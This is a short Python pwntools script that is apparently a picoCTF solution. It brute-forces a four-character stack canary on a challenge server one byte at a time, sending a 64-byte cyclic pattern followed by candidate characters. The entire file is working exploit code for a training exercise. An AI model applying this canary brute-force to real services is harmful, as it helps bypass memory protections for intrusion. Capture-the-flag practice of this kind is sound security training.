#!python3
from pwn import *
canary = ''
j = 1
while True:
    for i in range(65,123):
        r = remote('saturn.picoctf.net', 50632)
        r.recv()
        r.sendline(str(64+j).encode())
        #print(str(64+j).encode())
        r.recv()
        r.sendline(cyclic(64) +canary.encode() + chr(i).encode())
        #print(cyclic(64) +canary.encode() + chr(i).encode())
        a = r.recv()
        if a == b"Ok... Now Where's the Flag?\n":
            r.close()
            canary += chr(i)
            break
        r.close()
        #print (i)
    j += 1
    if j == 5:
        break
    #print (canary)
print (canary)
